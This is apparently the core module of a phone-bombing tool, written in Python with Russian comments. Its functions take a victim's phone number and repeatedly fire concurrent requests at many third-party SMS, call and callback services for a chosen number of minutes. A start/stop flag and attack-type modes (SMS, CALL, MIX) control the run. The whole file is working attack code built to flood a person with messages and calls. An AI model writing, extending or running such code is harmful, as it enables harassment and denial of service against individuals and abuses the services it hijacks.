from asyncio import ensure_future, gather, run
from aiohttp import ClientSession

from Core.Attack.Services import urls
from Core.Attack.Callback_Services import callback_urls

# Флаг остановки (threading-safe)
import threading
_stop_lock = threading.Lock()
_stop_flag = False

def _is_stopped():
    with _stop_lock:
        return _stop_flag

def _set_stopped(val=True):
    global _stop_flag
    with _stop_lock:
        _stop_flag = val

async def request(session, url, attack_type):
    try:
        if _is_stopped():
            return

        if attack_type == "MIX":
            allowed = ("SMS", "CALL", "FEEDBACK")
        elif attack_type == "SMS":
            allowed = ("SMS",)
        elif attack_type == "CALL":
            allowed = ("CALL",)
        else:
            allowed = ("SMS", "CALL", "FEEDBACK")

        if url['info']['attack'] in allowed:
            async with session.request(
                url['method'],
                url['url'],
                params=url.get('params'),
                cookies=url.get('cookies'),
                headers=url.get('headers'),
                data=url.get('data'),
                json=url.get('json'),
                timeout=20
            ) as response:
                return await response.text()
    except:
        pass

async def async_attacks(number, attack_type):
    async with ClientSession() as session:
        # Фильтруем сервисы ДО создания задач — не создаём задачи для неподходящих типов
        allowed_types = {"MIX": ("SMS", "CALL"), "SMS": ("SMS",), "CALL": ("CALL",)}
        atypes = allowed_types.get(attack_type, ("SMS", "CALL"))
        services = [s for s in (urls(number) + callback_urls(number)) if s['info']['attack'] in atypes]
        if not services:
            return
        tasks = [ensure_future(request(session, s, attack_type)) for s in services]
        await gather(*tasks)

def start_async_attacks(number, minutes, attack_type="MIX", stop_previous=False):
    import time
    if stop_previous:
        # Даём время старому потоку заметить остановку
        time.sleep(0.5)
        _set_stopped(False)
    start_time = time.time()
    duration = float(minutes) * 60
    while True:
        if _is_stopped():
            break
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
        run(async_attacks(number, attack_type))

def stop_attacks():
    _set_stopped(True)
